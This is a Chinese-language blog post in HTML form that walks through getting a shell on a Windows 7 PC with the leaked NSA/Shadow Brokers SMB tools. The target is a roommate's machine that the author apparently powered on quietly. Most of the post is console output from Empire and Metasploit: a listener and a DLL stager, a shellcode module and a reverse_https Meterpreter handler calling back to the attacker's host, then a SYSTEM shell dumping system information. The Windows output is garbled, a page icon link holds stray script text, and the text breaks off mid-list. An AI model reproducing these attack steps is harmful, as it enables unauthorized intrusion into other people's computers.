@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/embpgp.github.io/function%20()%20%7B%0A%20%20%20%20%20%20for%20(var%20_len2%20=%20arguments.length,%20args%20=%20new%20Array(_len2),%20_key2%20=%200;%20_key2%20%3C%20_len2;%20_key2++)%20%7B%0A%20%20%20%20%20%20%20%20args%5B_key2%5D%20=%20arguments%5B_key2%5D;%0A%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20return%20obj%5Bval%5D.apply(obj,%20args);%0A%20%20%20%20%7D">
+
+<link rel="stylesheet" href="/embpgp.github.io/css/main.css">
+
+
+<link rel="stylesheet" href="/embpgp.github.io/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"embpgp.github.io","root":"/embpgp.github.io/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="凌晨亲自测试NSA Tools，感叹MS08-067时代复现．">
+<meta property="og:type" content="article">
+<meta property="og:title" content="getshell on Win7 x64">
+<meta property="og:url" content="https://embpgp.github.io/2017/04/27/getshell-on-Win7-x64/index.html">
+<meta property="og:site_name" content="rutk1t0r&#39;s blog">
+<meta property="og:description" content="凌晨亲自测试NSA Tools，感叹MS08-067时代复现．">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://embpgp.github.io/images/fb.png">
+<meta property="article:published_time" content="2017-04-27T03:49:14.000Z">
+<meta property="article:modified_time" content="2025-03-11T12:14:38.966Z">
+<meta property="article:author" content="rutk1t0r">
+<meta property="article:tag" content="exploit">
+<meta property="article:tag" content="shellcode">
+<meta property="article:tag" content="NSA">
+<meta property="article:tag" content="msf">
+<meta property="article:tag" content="shadowbroker">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://embpgp.github.io/images/fb.png">
+
+<link rel="canonical" href="https://embpgp.github.io/2017/04/27/getshell-on-Win7-x64/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>getshell on Win7 x64 | rutk1t0r's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/embpgp.github.io/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rutk1t0r's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Developer and Researcher</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/embpgp.github.io/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/embpgp.github.io/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/embpgp.github.io/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">29</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/embpgp.github.io/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/embpgp.github.io/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">39</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/embpgp.github.io/schedule/notes.html" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://embpgp.github.io/2017/04/27/getshell-on-Win7-x64/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/embpgp.github.io/images/avatar.png">
+      <meta itemprop="name" content="rutk1t0r">
+      <meta itemprop="description" content="gnireenigne 0x41414141 \xff\xe4\xcc">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rutk1t0r's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          getshell on Win7 x64
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-04-27 11:49:14" itemprop="dateCreated datePublished" datetime="2017-04-27T11:49:14+08:00">2017-04-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-03-11 20:14:38" itemprop="dateModified" datetime="2025-03-11T20:14:38+08:00">2025-03-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/embpgp.github.io/categories/study/" itemprop="url" rel="index"><span itemprop="name">study</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/embpgp.github.io/categories/study/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>8.6k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>8 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>凌晨亲自测试NSA Tools，感叹MS08-067时代复现．</p>
+</blockquote>
+<span id="more"></span>
+<hr>
+<p>参考链接:<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/41896.pdf">https://www.exploit-db.com/docs/41896.pdf</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=OBP_kH6EYmk">https://www.youtube.com/watch?v=OBP_kH6EYmk</a></p>
+<hr>
+<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>由于近期shadowbroker一直抢占安全头条，随着NSA泄露的工具被解密在github上面，我也想感受一下这些工具的威力，便找了些教程来测试一番．其实完全可以按照第一个链接的PDF文档来搭建环境，文章中说到Win7和Win2K8通过SMB漏洞不需要验证直接可以利用．</p>
+<p>target:Win 7 x64 192.168.31.252<br>attacker_1:WinXP 192.168.31.52<br>attacker_2:Ubuntu 16.04 192.168.31.30</p>
+<p>没错，我用的就是小米路由器(31网段),ubuntu无线连接并开启XP虚拟机桥接到物理机使其分配到同网段IP，将室友的Win7悄悄地开机并默认连接到路由器即可开始．按照教程还必须安装py2.6和pywin32v2.12在XP攻击机上，ubuntu上安装Empire和MSF用来生成恶意dll和反弹shell．</p>
+<h1 id="跑起来"><a href="#跑起来" class="headerlink" title="跑起来"></a>跑起来</h1><p>教程良心，可直接根据提示跑起来，以下为截图或shell echo.</p>
+<h2 id="改fb-py"><a href="#改fb-py" class="headerlink" title="改fb.py"></a>改fb.py</h2><p>从github上down源码下来改几处代码即可<br><img src="/images/fb.png" alt="fb.png"></p>
+<h2 id="跑Empire"><a href="#跑Empire" class="headerlink" title="跑Empire"></a>跑Empire</h2><p>从github上down源码install.sh即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">====================================================================================</span><br><span class="line"> Empire: PowerShell post-exploitation agent | [Version]: 1.6.0</span><br><span class="line">====================================================================================</span><br><span class="line"> [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3</span><br><span class="line">====================================================================================</span><br><span class="line"></span><br><span class="line">   _______ .___  ___. .______    __  .______       _______</span><br><span class="line">  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|</span><br><span class="line">  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__</span><br><span class="line">  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|</span><br><span class="line">  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____</span><br><span class="line">  |_______||__|  |__| | _|      |__| | _| `._____||_______|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       181 modules currently loaded</span><br><span class="line"></span><br><span class="line">       0 listeners currently active</span><br><span class="line"></span><br><span class="line">       0 agents currently active</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire) &gt; <span class="built_in">set</span> Name Eternal</span><br><span class="line">[!] Please choose <span class="string">&#x27;ip_whitelist&#x27;</span> or <span class="string">&#x27;ip_blacklist&#x27;</span></span><br><span class="line">(Empire) &gt; list</span><br><span class="line">list       listeners  </span><br><span class="line">(Empire) &gt; listeners</span><br><span class="line">[!] No listeners currently active </span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Name Eternal</span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Host http://192.168.31.30</span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Port 8080</span><br><span class="line">(Empire: listeners) &gt; execute</span><br><span class="line">[!] Error starting listener on port 8080: [Errno 98] Address already <span class="keyword">in</span> use</span><br><span class="line">[!] Error starting listener on port 8080, port likely already <span class="keyword">in</span> use.</span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Port 8000</span><br><span class="line">(Empire: listeners) &gt; execute</span><br><span class="line">[*] Listener <span class="string">&#x27;Eternal&#x27;</span> successfully started.</span><br><span class="line">(Empire: listeners) &gt; list</span><br><span class="line"></span><br><span class="line">[*] Active listeners:</span><br><span class="line"></span><br><span class="line">  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target</span><br><span class="line">  --    ----              ----                                 -------   ------------   --------    ---------------</span><br><span class="line">  1     Eternal           http://192.168.31.30:8000            native    5/0.0                      </span><br><span class="line"></span><br><span class="line">(Empire: listeners) &gt; usestager dll Eternal</span><br><span class="line">(Empire: stager/dll) &gt; <span class="built_in">set</span> Arch x64</span><br><span class="line">(Empire: stager/dll) &gt; execute</span><br><span class="line"></span><br><span class="line">[*] Stager output written out to: /tmp/launcher.dll</span><br><span class="line"></span><br><span class="line">(Empire: stager/dll) &gt; [+] Initial agent RDZ4SYWEFTKBF3FD from 192.168.31.252 now active</span><br><span class="line"></span><br><span class="line">(Empire: stager/dll) &gt; agents</span><br><span class="line"></span><br><span class="line">[*] Active agents:</span><br><span class="line"></span><br><span class="line">  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen</span><br><span class="line">  ---------          -----------     ------------    ---------           -------             -----    --------------------</span><br><span class="line">  RDZ4SYWEFTKBF3FD   192.168.31.252  USER-20170312IA *WorkGroup\SYSTEM   lsass/792           5/0.0    2017-04-27 02:09:35</span><br><span class="line"></span><br><span class="line">(Empire: agents) &gt; sysinfo</span><br><span class="line">*** Unknown syntax: sysinfo</span><br><span class="line">(Empire: agents) &gt; interact RDZ4SYWEFTKBF3FD</span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; systeminfo</span><br><span class="line">[!] Command not recognized.</span><br><span class="line">[*] Use <span class="string">&#x27;help&#x27;</span> or <span class="string">&#x27;help agentcmds&#x27;</span> to see available commands.</span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; sysinfo</span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; </span><br><span class="line">Description      : Qualcomm Atheros AR9485WB-EG Wireless Network Adapter</span><br><span class="line">MACAddress       : XX:XX:XX:XX:XX:XX</span><br><span class="line">DHCPEnabled      : True</span><br><span class="line">IPAddress        : 192.168.31.252,fe80::5d70:a440:294c:b455</span><br><span class="line">IPSubnet         : 255.255.255.0,64</span><br><span class="line">DefaultIPGateway : 192.168.31.1</span><br><span class="line">DNSServer        : 192.168.31.1</span><br><span class="line">DNSHostName      : USER-20170312IA</span><br><span class="line">DNSSuffix        :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; usemodule code_execution/invoke_shellcode</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; <span class="built_in">set</span> Lhost 192.168.31.30</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; <span class="built_in">set</span> Lport 9999</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; execute</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; </span><br><span class="line">Job started: Debug32_gnns4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="跑msf"><a href="#跑msf" class="headerlink" title="跑msf"></a>跑msf</h2><p>跑Kali或者Debian系GNU/Linux都可，安装msf跑起来接收反弹shell，主要用meterpreter．</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; </span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_h</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_hop_http</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http_proxy_pstore</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_https</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_https_proxy</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_https</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.31.30</span><br><span class="line">LHOST =&gt; 192.168.31.30</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 9999</span><br><span class="line">LPORT =&gt; 9999</span><br><span class="line">msf exploit(handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started HTTPS reverse handler on https://192.168.31.30:9999</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] https://192.168.31.30:9999 handling request from 192.168.31.252; (UUID: 7pzlvccd) Staging Native payload...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.31.30:9999 -&gt; 192.168.31.252:49714) at 2017-04-27 02:20:13 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : USER-20170312IA</span><br><span class="line">OS              : Windows 7 (Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64 (Current Process is WOW64)</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WorkGroup</span><br><span class="line">Logged On Users : 1</span><br><span class="line">Meterpreter     : x86/win32</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2432 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ�</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;systeminfo</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">������:           USER-20170312IA</span><br><span class="line">OS ����:          Microsoft Windows 7 �콢�� </span><br><span class="line">OS �汾:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS ������:        Microsoft Corporation</span><br><span class="line">OS ����:          ��������վ</span><br><span class="line">OS ��������:      Multiprocessor Free</span><br><span class="line">ע����������:     User</span><br><span class="line">ע������֯:       User</span><br><span class="line">��Ʒ ID:          00426-OEM-8992662-00006</span><br><span class="line">��ʼ��װ����:     2017/3/12, 10:33:43</span><br><span class="line">ϵͳ����ʱ��:     2017/4/27, 1:45:53</span><br><span class="line">ϵͳ������:       Hasee Computer</span><br><span class="line">ϵͳ�ͺ�:         CW65</span><br><span class="line">ϵͳ����:         x64-based PC</span><br><span class="line">������:           ��װ�� 1 �������</span><br><span class="line">                  [01]: Intel64 Family 6 Model 58 Stepping 9 GenuineIntel ~1275 Mhz</span><br><span class="line">BIOS �汾:        American Megatrends Inc. 4.6.5, 2013/5/6</span><br><span class="line">Windows Ŀ¼:     C:\Windows</span><br><span class="line">ϵͳĿ¼:         C:\Windows\system32</span><br><span class="line">�����豸:         \Device\HarddiskVolume1</span><br><span class="line">ϵͳ��������:     zh-cn;����(�й�)</span><br><span class="line">���뷨��������:   zh-cn;����(�й�)</span><br><span class="line">ʱ��:             (UTC+08:00)���������죬�����ر�����������³ľ�</span><br><span class="line">�����ڴ�����:     3,991 MB</span><br><span class="line">���õ������ڴ�:   2,494 MB</span><br><span class="line">�����ڴ�: ����ֵ: 7,981 MB</span><br><span class="line">�����ڴ�: ����:   6,291 MB</span><br><span class="line">�����ڴ�: ʹ����: 1,690 MB</span><br><span class="line">ҳ���ļ�λ��:     C:\pagefile.sys</span><br><span class="line">��:               WorkGroup</span><br><span class="line">��¼������:       ��ȱ</span><br><span class="line">�޲�����:         ��װ�� 124 ���޲����</span><br><span class="line">                  [01]: KB2849697</span><br><span class="line">                  [02]: KB2849696</span><br><span class="line">                  [03]: KB2841134</span><br><span class="line">                  [04]: KB2841134</span><br><span class="line">                  [05]: KB2670838</span><br><span class="line">                  [06]: KB2830477</span><br><span class="line">                  [07]: KB2592687</span><br><span class="line">                  [08]: KB917607</span><br><span class="line">                  [09]: KB2909210</span><br><span class="line">                  [10]: KB2929437</span><br><span class="line">                  [11]: KB3000483</span><br><span class="line">                  [12]: KB3004361</span><br><span class="line">                  [13]: KB3004375</span><br><span class="line">                  [14]: KB3019215</span><br><span class="line">                  [15]: KB3020369</span><br><span class="line">                  [16]: KB3020388</span><br><span class="line">                  [17]: KB3021674</span><br><span class="line">                  [18]: KB3022777</span><br><span class="line">                  [19]: KB3023215</span><br><span class="line">                  [20]: KB3030377</span><br><span class="line">                  [21]: KB3031432</span><br><span class="line">                  [22]: KB3032655</span><br><span class="line">                  [23]: KB3033889</span><br><span class="line">                  [24]: KB3033890</span><br><span class="line">                  [25]: KB3033929</span><br><span class="line">                  [26]: KB3035126</span><br><span class="line">                  [27]: KB3035132</span><br><span class="line">                  [28]: KB3037574</span><br><span class="line">                  [29]: KB3042058</span><br><span class="line">                  [30]: KB3042553</span><br><span class="line">                  [31]: KB3045685</span><br><span class="line">                  [32]: KB3046017</span><br><span class="line">                  [33]: KB3046269</span><br><span class="line">                  [34]: KB3055642</span><br><span class="line">                  [35]: KB3059317</span><br><span class="line">                  [36]: KB3060716</span><br><span class="line">                  [37]: KB3061518</span><br><span class="line">                  [38]: KB3067903</span><br><span class="line">                  [39]: KB3069392</span><br><span class="line">                  [40]: KB3069762</span><br><span class="line">                  [41]: KB3071756</span><br><span class="line">                  [42]: KB3072305</span><br><span class="line">                  [43]: KB3072630</span><br><span class="line">                  [44]: KB3072633</span><br><span class="line">                  [45]: KB3074543</span><br><span class="line">                  [46]: 